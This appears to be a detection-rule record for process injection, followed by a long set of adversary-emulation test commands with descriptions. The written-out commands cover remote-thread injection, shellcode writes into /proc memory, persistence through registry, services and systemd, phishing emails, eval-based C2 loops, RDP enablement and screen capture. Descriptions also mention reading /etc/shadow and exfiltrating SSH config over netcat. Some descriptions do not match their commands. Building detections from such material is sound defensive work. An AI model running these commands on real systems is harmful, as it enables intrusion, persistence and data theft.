rules.title: Process Injection via NLP Pattern Matching
rules.description: Detects Process Injection activity via NLP pattern matching
falsepositives: Legitimate use of powershell.exe or cmd.exe for administrative tasks
Use of Invoke-WebRequest for downloading updates or patches

attacks.description: Creates a dummy DLL from a base64 string in %TEMP% and loads it into a new process using rundll32.exe, demonstrating DLL injection.
attacks.expected_behavior: The dummy DLL is decoded and executed; the EntryPoint function runs inside the rundll32.exe process, simulating a process injection without affecting system stability.

attacks.command: powershell -Command \"$pid = (Get-Process notepad).Id; $payload = 'calc.exe'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload); $size = $bytes.Length; $proc = Get-Process -Id $pid; $handle = $proc.Handle; $addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size); [System.Runtime.InteropServices.Marshal]::Copy($bytes,0,$addr,$size); Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId); [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);' -Name Win32 -Namespace Win32 -PassThru; $open = [Win32.Win32]::OpenProcess(0x001F0FFF,$false,$pid); $alloc = [Win32.Win32]::VirtualAllocEx($open,$null,$size,0x3000,0x40); [Win32.Win32]::WriteProcessMemory($open,$alloc,$bytes,$size,[ref]0); $thread = [Win32.Win32]::CreateRemoteThread($open,$null,0,$alloc,$null,0,$null);\"
attacks.description: PowerShell script that injects the 'calc.exe' string into a running notepad process using OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread via compiled P/Invoke signatures.
attacks.expected_behavior: The script opens the notepad process, allocates memory, writes the payload path, and creates a remote thread that would launch calc.exe inside notepad's context (calc may appear briefly). No permanent changes are made.

attacks.command: powershell -EncodedCommand QABlAHgAaQB0AGUAcgAgACAAJABwAGkAZAA... (Base64 string of the same injection script in UTF-16LE)
attacks.description: Executes the same injection logic as command 2 but encoded in Base64 to hide the script from plain‑text detection, a common evasion technique.
attacks.expected_behavior: PowerShell decodes the Base64 payload and runs the injection script, resulting in the same benign calc.exe launch inside notepad without visible script text.

attacks.description: Uses gdb to attach to a running process and calls dlopen to load a benign shared library, demonstrating classic process injection.
attacks.expected_behavior: The target process loads /tmp/libtest.so into its address space; if the library contains benign code (e.g., a log message), it will execute within the process.

attacks.description: Preloads a benign shared library into a newly started process using the LD_PRELOAD environment variable, a simple form of injection without needing elevated rights.
attacks.expected_behavior: The /usr/bin/yes process starts with /tmp/libtest.so preloaded, causing any initialization code in the library to run in the context of the new process.

attacks.command: dd if=/tmp/shellcode.bin of=/proc/$PID/mem bs=1 seek=$(awk '/rw-p/ {print strtonum("0x" $1)}' /proc/$PID/maps | head -n1) conv=notrunc
attacks.description: Writes raw shellcode from a benign binary file directly into the writable memory region of a target process via the /proc/<pid>/mem interface, representing an advanced injection technique.
attacks.expected_behavior: The shellcode is placed into the first writable memory segment of the target process; if the process's instruction pointer is later redirected to this region, the shellcode would execute. For testing, the shellcode can be a harmless NOP sled.

attacks.description: Uses the built‑in net.exe utility to list all local user accounts on the machine.
attacks.expected_behavior: Displays a list of local user account names in the console.

attacks.description: Queries the domain controller (if joined to a domain) to enumerate domain user accounts.
attacks.expected_behavior: Outputs the usernames of domain accounts reachable from the host.

attacks.description: PowerShell cmdlet that retrieves enabled local user accounts and prints only their names.
attacks.expected_behavior: Lists the names of enabled local user accounts, one per line.

attacks.description: Basic enumeration of all local user accounts by displaying the contents of /etc/passwd.
attacks.expected_behavior: Outputs the full /etc/passwd file, showing each account entry with fields such as username, UID, GID, home directory, and shell.

attacks.description: Intermediate account discovery using getent to query the NSS database and awk to list only usernames.
attacks.expected_behavior: Prints a list of usernames, one per line, derived from the system's account database.

attacks.description: Advanced privileged account discovery by reading the /etc/shadow file, which contains password hashes and requires root access.
attacks.expected_behavior: Outputs the contents of /etc/shadow, showing each account's hashed password and related metadata; will fail with permission denied if not run as root.

attacks.description: Sends a simple phishing email with a benign attachment using the built‑in Send‑MailMessage cmdlet.
attacks.expected_behavior: An email is transmitted to the victim address containing the test.txt attachment; no payload is executed.

attacks.command: powershell -Command "$html = 'Please update your account here.'; Send-MailMessage -From 'it-support@example.com' -To 'employee@example.com' -Subject 'Account Verification Required' -Body $html -BodyAsHtml -SmtpServer 'smtp.example.com'"
attacks.description: Creates an HTML phishing email containing a malicious link and sends it via Send‑MailMessage.
attacks.expected_behavior: The victim receives an email with a clickable link pointing to a test URL; no code execution occurs.

attacks.command: powershell -Command "$outlook = New-Object -ComObject Outlook.Application; $mail = $outlook.CreateItem(0); $mail.To = 'target@example.com'; $mail.Subject = 'Urgent: Open the attached file'; $mail.Body = 'See attachment.'; $lnkPath = \"$env:TEMP\\malicious.lnk\"; $ws = New-Object -ComObject WScript.Shell; $shortcut = $ws.CreateShortcut($lnkPath); $shortcut.TargetPath = 'http://malicious.example.com'; $shortcut.Save(); $mail.Attachments.Add($lnkPath); $mail.Send();"
attacks.description: Uses Outlook COM automation to craft a phishing email with a .lnk shortcut attachment that points to a malicious URL.
attacks.expected_behavior: Outlook creates and sends an email containing a shortcut file; the shortcut points to a test URL; no execution is performed.

attacks.description: Simulate downloading a phishing webpage using curl
attacks.expected_behavior: Downloads a benign HTML file to /tmp/phish.html

attacks.command: echo 'You have won a prize! Click here to claim: http://example.com/prize' > /tmp/phish_email.txt
attacks.description: Create a fake phishing email using echo
attacks.expected_behavior: Creates a text file /tmp/phish_email.txt with a benign phishing email content

attacks.description: Simulate downloading a phishing webpage using wget
attacks.expected_behavior: Downloads a benign HTML file to /tmp/phish_page.html

attacks.command: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v TestPersistence /t REG_SZ /d "cmd.exe /c echo Hello > %TEMP%\\test.txt" /f
attacks.description: Adds a Run registry entry for the current user that launches a harmless command at logon.
attacks.expected_behavior: On the next user logon, cmd.exe runs and creates a file test.txt in the user's TEMP directory containing the text "Hello".

attacks.command: sc create TestService binPath= "cmd.exe /c echo ServiceStarted > %TEMP%\\svc.txt" start= auto
attacks.description: Creates a new Windows service that runs a benign echo command, set to start automatically.
attacks.expected_behavior: The service "TestService" is installed; when the service starts (e.g., after a reboot), it creates svc.txt in the TEMP folder with the text "ServiceStarted".

attacks.description: Creates a scheduled task that runs at each logon with highest privileges, executing a harmless echo command.
attacks.expected_behavior: A task named "TestTask" is registered; on every user logon it runs cmd.exe which writes "TaskRun" to task.txt in the TEMP directory.

attacks.command:
printf '[Unit]
Description=Malicious Service
[Service]
ExecStart=/usr/bin/sleep 1000
[Install]
WantedBy=multi-user.target
' > /etc/systemd/system/malicious.service && systemctl daemon-reload && systemctl enable malicious.service && systemctl start malicious.service
attacks.description: Create a new systemd service that runs a harmless sleep command and enable it for automatic start at boot.
attacks.expected_behavior: A file /etc/systemd/system/malicious.service is created, systemd daemon is reloaded, the service is enabled, and the sleep process starts immediately and will restart on each boot.

attacks.description: Uses certutil to download a small text file over HTTP, leveraging the application‑layer protocol for C2.
attacks.expected_behavior: The file benign.txt is written to the %TEMP% directory after a successful HTTP GET request.

attacks.description: Uses bitsadmin to download a binary file via HTTP, demonstrating background intelligent transfer service traffic as an application‑layer channel.
attacks.expected_behavior: BITS creates a background job named myjob, downloads benign.bin from the remote server, and saves it to %TEMP%.

attacks.description: PowerShell script creates a WebClient object and performs an HTTP POST, sending data to a remote endpoint as a covert C2 channel.
attacks.expected_behavior: The script issues an HTTP POST request to http://example.com/collect with the body 'test data'. No files are written locally.

attacks.description: Basic HTTP GET request to a C2 endpoint to signal beaconing.
attacks.expected_behavior: The command sends a silent HTTP GET to the local server on port 8080 and discards the response, emulating a beacon without affecting the system.

attacks.description: Intermediate HTTP POST that exfiltrates basic host information to the C2 server.
attacks.expected_behavior: The command posts a small payload containing the hostname and current user to the C2 endpoint; the server receives the data but no system changes occur.

attacks.command: curl -s -N http://127.0.0.1:8080/stream | while IFS= read -r cmd; do eval "$cmd"; done
attacks.description: Advanced persistent HTTP stream that reads commands line‑by‑line from the C2 server and executes them.
attacks.expected_behavior: The command opens a nonstop HTTP connection to the /stream endpoint, reads each line as a command, and evaluates it. In a test environment, the server can send harmless commands (e.g., 'echo test'), demonstrating command execution via an application‑layer protocol.

attacks.command: openssl s_client -quiet -connect 127.0.0.1:8443 < /dev/null | while IFS= read -r line; do eval "$line"; done
attacks.description: Advanced TLS‑encrypted channel that receives and executes commands from a C2 server over HTTPS.
attacks.expected_behavior: Establishes a TLS connection to localhost on port 8443, reads each incoming line as a command, and evaluates it. When used with a test server that sends benign commands, it demonstrates encrypted application‑layer C2 communication.

attacks.description: Creates a plain‑text file and then encodes it to Base64 using certutil, obscuring the original content.
attacks.expected_behavior: A file %TEMP%\obf.b64 is created containing the Base64 representation of "TestContent" while the original file remains unchanged.

attacks.description: Executes a PowerShell command that is supplied as a UTF‑16LE Base64 string, hiding the actual command text.
attacks.expected_behavior: PowerShell decodes the Base64 payload and runs "Write-Output 'Hello'", printing "Hello" to the console.

attacks.description: Writes a hex‑encoded VBS payload to a temporary file, decodes it with certutil, and executes the resulting script, demonstrating multi‑step file obfuscation.
attacks.expected_behavior: A VBS file displaying a message box with "Hello" is generated and executed; the script file is left in %TEMP% after execution.

attacks.description: Basic obfuscation: a Base64‑encoded script that echoes 'Hello World' is decoded, saved, made executable, and executed.
attacks.expected_behavior: The command creates a temporary script that prints 'Hello World' to the console when executed.

attacks.description: Intermediate obfuscation: a hex‑encoded script that echoes 'Hello Linux' is converted back to text, saved, made executable, and run.
attacks.expected_behavior: The command produces a temporary script that prints 'Hello Linux' when executed.

attacks.description: Advanced obfuscation: a gzipped script containing 'echo Advanced Obfuscation' is Base64‑encoded, decoded, decompressed, saved, made executable, and executed.
attacks.expected_behavior: The command creates a temporary script that prints 'Advanced Obfuscation' to the console when run.

attacks.description: Read a sample file, Base64‑encode its contents, and exfiltrate via an HTTP GET request to the C2 server.
attacks.expected_behavior: The command contacts http://example.com with a query string containing the Base64 data; no file is written locally beyond the temporary read.

attacks.description: Compress a directory of log files, encode the ZIP archive, and exfiltrate the data via an HTTP POST request.
attacks.expected_behavior: Creates a ZIP archive in the TEMP folder, reads it, encodes it, and sends it to http://example.com/upload using POST; the archive file remains in TEMP for cleanup.

attacks.description: Open a raw TCP connection to the C2 server and stream the contents of a secret file directly over the same channel.
attacks.expected_behavior: Establishes a TCP socket to example.com on port 4444 and transmits the file data; no HTTP traffic is generated.

attacks.description: Send a small system file over a raw TCP connection using netcat, simulating exfiltration over a C2 channel.
attacks.expected_behavior: The content of /etc/hostname is transmitted to the listening service on 127.0.0.1:4444.

attacks.description: Archive the /var/log directory and POST the archive to a local HTTP endpoint, representing exfiltration over a C2 channel via HTTP.
attacks.expected_behavior: Creates /tmp/logs.tar.gz and sends its binary data via HTTP POST to localhost on port 8080 at the /upload path.

attacks.description: Compress user SSH configuration, encrypt it with OpenSSL, and stream the encrypted payload over TCP using netcat, mimicking encrypted exfiltration over a C2 channel.
attacks.expected_behavior: The compressed and AES‑256‑CBC encrypted data is sent to a listening service on 127.0.0.1:5555.

attacks.description: Uses certutil to download a file from a remote server, mimicking the retrieval of a malicious payload after exploiting a public‑facing web application.
attacks.expected_behavior: The file payload.exe is saved to the user's temporary directory and certutil reports a successful download.

attacks.description: Leverages bitsadmin to initiate a BITS transfer from a remote URL, representing a common technique to fetch malicious code after compromising a public service.
attacks.expected_behavior: BITS creates a background transfer job, downloads payload.exe to %TEMP%, and reports completion in the console.

attacks.description: Runs a PowerShell one‑liner that sends a crafted POST request to a vulnerable endpoint, captures the response, and writes it to a temporary file, illustrating an advanced exploitation payload.
attacks.expected_behavior: The script posts data to the target URL, receives a response, and stores the response text in %TEMP%\response.txt without raising errors.

attacks.description: Basic exploitation attempt: send a crafted GET request with a test XSS payload to a public‑facing web application endpoint.
attacks.expected_behavior: The server returns an HTTP 200 response; if the endpoint reflects the input, the XSS payload would be visible in the response body.

attacks.description: Intermediate exploitation: use netcat to send a raw HTTP POST containing a command‑injection payload to a vulnerable API endpoint.
attacks.expected_behavior: The target processes the POST request; if vulnerable, it may execute the injected commands and return their output (e.g., the result of `whoami` and `id`).

attacks.description: Advanced exploitation simulation: download a benign script and execute it with elevated privileges to mimic post‑exploitation persistence after compromising a public‑facing service.
attacks.expected_behavior: The script runs under sudo; in a test scenario it could create a file in /tmp or print a confirmation message, demonstrating privilege escalation without harming the system.

attacks.description: Basic network service discovery using netstat to list all active TCP/UDP connections and listening ports with owning process IDs.
attacks.expected_behavior: Outputs a table showing protocol, local address, foreign address, state, and PID for each socket, revealing which services are listening on the host.

attacks.description: Intermediate discovery using PowerShell to retrieve only TCP connections that are in the LISTEN state, providing a concise view of network services.
attacks.expected_behavior: Displays a formatted table of local listening ports, associated process IDs, and interface information.

attacks.description: Advanced discovery of network services on a remote host by enumerating SMB shares and services exposed via the NetBIOS/SMB protocol.
attacks.expected_behavior: Lists the shared resources (e.g., shared folders, printers) available on the remote machine at 192.168.1.10, indicating which network services are exposed.

attacks.description: Basic network service discovery using netstat to list all listening TCP and UDP ports.
attacks.expected_behavior: Displays a table of local listening sockets with protocol, local address, and port numbers.

attacks.description: Intermediate discovery using ss to list listening sockets along with the owning process IDs and program names.
attacks.expected_behavior: Outputs detailed information about each listening socket, including PID/Program name when run with sufficient privileges.

attacks.description: Advanced discovery using nmap to perform a full TCP connect scan of the localhost, probing all ports and attempting service version detection.
attacks.expected_behavior: Nmap reports open ports on 127.0.0.1 and, when possible, identifies the service name and version for each.

attacks.description: Creates a single test file and archives it into a zip using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: A file named testdata.txt is written to the TEMP folder, then archive.zip containing that file is created in the same folder.

attacks.command: cmd /c "echo file1 > %TEMP%\\file1.txt && echo file2 > %TEMP%\\file2.txt && tar -a -c -f %TEMP%\\collected.zip -C %TEMP% file1.txt file2.txt"
attacks.description: Creates two text files and packages them into a zip archive using the native tar.exe utility.
attacks.expected_behavior: Two files (file1.txt, file2.txt) are created in the TEMP directory and then bundled into collected.zip located in the same directory.

attacks.command: powershell -Command "mkdir $env:TEMP\\logs -ErrorAction SilentlyContinue; Set-Content -Path \"$env:TEMP\\logs\\app.log\" -Value 'log entry' -Force; Set-Content -Path \"$env:TEMP\\logs\\error.log\" -Value 'error entry' -Force; Compress-Archive -Path \"$env:TEMP\\logs\\*.log\" -DestinationPath \"$env:TEMP\\logs_archive.zip\" -Force"
attacks.description: Creates a logs directory with multiple .log files and archives all matching logs into a single zip file.
attacks.expected_behavior: A logs folder is created under TEMP, two log files are written, and logs_archive.zip containing both .log files is produced in the TEMP directory.

attacks.description: Create a simple tar archive of a test file containing collected data.
attacks.expected_behavior: A file /tmp/archive.tar is created containing the contents of /tmp/collected_data.txt.

attacks.description: Create a password‑protected zip archive of a directory with collected data.
attacks.expected_behavior: A zip file /tmp/archive.zip is created, encrypted with the password 'P@ssw0rd', containing all files under /tmp/collected_data_dir.

attacks.description: Compress the collected data directory into a tar.gz stream and split the output into 5 MiB chunks.
attacks.expected_behavior: The pipeline produces a series of files named /tmp/archive.tar.gz.part_aa, /tmp/archive.tar.gz.part_ab, etc., each up to 5 MiB, representing the compressed archive of /tmp/collected_data_dir.

attacks.description: Capture the primary display screen and save as PNG in the temporary folder.
attacks.expected_behavior: A file named screenshot_basic.png is created in %TEMP% containing a bitmap of the current primary monitor.

attacks.command: powershell -Command "$img = '$env:TEMP\\screenshot_intermediate.png'; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save($img); Compress-Archive -Path $img -DestinationPath '$env:TEMP\\screenshot_archive.zip' -Force; Remove-Item $img -ErrorAction SilentlyContinue;"
attacks.description: Capture screen, save PNG, then compress it into a ZIP archive and delete the original image.
attacks.expected_behavior: Creates screenshot_intermediate.png, then a ZIP file screenshot_archive.zip containing the image; the original PNG is removed.

attacks.command: powershell -Command "$ts = Get-Date -Format 'yyyyMMdd_HHmmss'; $file = \"$env:TEMP\\screenshot_$ts.png\"; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save($file); Write-Host \"Screenshot saved to $file\";"
attacks.description: Capture screen with a timestamped filename, saving to %TEMP% and echoing the path.
attacks.expected_behavior: A PNG file with a name like screenshot_20231128_153045.png is created in %TEMP% and the path is printed to the console.

attacks.description: Basic screen capture using the 'scrot' utility, saving a PNG file with a timestamp in the user's home directory.
attacks.expected_behavior: Creates a screenshot image file named like 'screenshot_1700000000.png' in $HOME.

attacks.description: Intermediate capture using ImageMagick's 'import' to grab the entire root window and store it as a PNG with a timestamp.
attacks.expected_behavior: Generates a full‑desktop screenshot file in $HOME, e.g., 'screenshot_1700000000.png'.

attacks.description: Advanced screen capture using 'ffmpeg' to record a 5‑second video of the X11 display at 25 fps, saved as an MP4 file with a timestamp.
attacks.expected_behavior: Produces a video file like 'screencap_1700000000.mp4' in $HOME containing a short recording of the desktop.

attacks.command: cmd.exe /c "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes"
attacks.description: Enable Remote Desktop (RDP) service and allow it through Windows Firewall.
attacks.expected_behavior: The RDP service is enabled (registry key fDenyTSConnections set to 0) and the firewall rule for Remote Desktop is turned on, allowing inbound RDP connections.

attacks.description: Initiate an RDP client connection to a remote host at 192.168.1.100.
attacks.expected_behavior: The Remote Desktop Connection client launches and attempts to establish a session with the specified IP address.

attacks.description: List current RDP (remote desktop) sessions on the local machine.
attacks.expected_behavior: Displays a table of logged‑on users, session IDs, and connection states for any active RDP sessions.

attacks.description: Basic RDP client connection using rdesktop to a remote host.
attacks.expected_behavior: Opens an RDP session window attempting to connect to the host at 10.0.0.5 on the default RDP port (3389).

attacks.description: Intermediate RDP connection using xfreerdp with explicit credentials and clipboard redirection.
attacks.expected_behavior: Establishes an RDP session to 10.0.0.5 using the supplied username and password, enabling clipboard sharing between local and remote desktops.

attacks.description: Advanced scenario: creates an SSH tunnel forwarding local port 3389 to the remote host, then initiates RDP over the tunnel.
attacks.expected_behavior: Background SSH process forwards local port 3389 to the remote host's RDP service; rdesktop then connects to localhost, routing traffic through the tunnel.
